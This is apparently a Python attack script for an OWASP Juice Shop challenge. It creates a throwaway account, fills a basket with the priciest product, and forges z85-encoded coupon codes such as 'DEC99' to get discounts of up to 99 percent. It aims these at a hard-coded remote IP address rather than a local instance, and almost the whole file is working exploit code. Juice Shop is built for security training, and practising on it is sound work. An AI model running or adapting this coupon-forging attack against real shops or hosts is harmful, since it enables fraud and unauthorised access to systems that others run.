#!/usr/bin/env python3

import requests
import time
import zmq

def test_working_coupon_method(base_url):
    print(f"🎯 Testing WORKING coupon method from your archive")
    print(f"Target: {base_url}")
    print(f"Method: z85.encode(b'DEC99') format")
    
    session = requests.Session()
    
    # Auth setup
    email = f"working{int(time.time())}@test.com"
    password = "Test123!"
    
    session.post(f"{base_url}/api/Users/", json={
        "email": email, "password": password, "passwordRepeat": password,
        "securityQuestion": {"id": 1, "question": "test"}, "securityAnswer": "test"
    })
    
    login = session.post(f"{base_url}/rest/user/login", json={
        "email": email, "password": password
    })
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        session.headers['Authorization'] = f'Bearer {token}'
        print("✅ Authenticated")
        
        # Add expensive product
        products = session.get(f"{base_url}/rest/products/search").json()['data']
        expensive = max(products, key=lambda p: p['price'])
        session.post(f"{base_url}/api/BasketItems/", json={
            "ProductId": expensive['id'], "quantity": 1
        })
        print(f"✅ Added: {expensive['name']} (${expensive['price']})")
        
        # Get basket ID
        user_data = session.get(f"{base_url}/rest/user/whoami").json()['user']
        basket_id = user_data.get('bid', 1)
        
        # Test your working method: z85.encode(b"DEC99")
        print("\\n🔧 Using your working z85 method...")
        
        # Try various high-discount combinations from your format
        test_codes = [
            b"DEC99",  # Your exact working code
            b"NOV99",  # November 99%
            b"OCT99",  # October 99%
            b"DEC90",  # December 90%
            b"DEC85",  # December 85%
            b"OCT85",  # October 85%
        ]
        
        for code_bytes in test_codes:
            try:
                # Use zmq's z85 encoding (same as your working version)
                coupon_encoded = zmq.z85.encode(code_bytes)
                
                print(f"   Testing: {code_bytes.decode()} → {coupon_encoded}")
                
                coupon_response = session.put(f"{base_url}/rest/basket/{basket_id}/coupon/{coupon_encoded}", json={})
                
                if coupon_response.status_code == 200:
                    result = coupon_response.json()
                    discount = result.get('discount', 0)
                    
                    if discount >= 80:
                        print(f"   🎉 SUCCESS! {code_bytes.decode()} gives {discount}% discount!")
                        print(f"   🏆 CHALLENGE SOLVED using your working method!")
                        return True
                    elif discount > 0:
                        print(f"   ✅ Valid: {discount}% (insufficient but working!)")
                else:
                    print(f"   ❌ HTTP {coupon_response.status_code}")
                    
            except Exception as e:
                print(f"   Error with {code_bytes}: {e}")
        
        print("\\n🔍 Your format didn't work either on current instances")
        
    return False

# Test on the v13.3.0 instance (most likely to work)
success = test_working_coupon_method("http://66.42.93.220:9000")

if success:
    print(f"\\n✅ CONFIRMED: Script works with your original method!")
else:
    print(f"\\n🔧 Even your working format doesn't work on current instances")
    print(f"   Your June archive might have used specific Juice Shop build")
    print(f"   or custom configuration that enabled coupons")

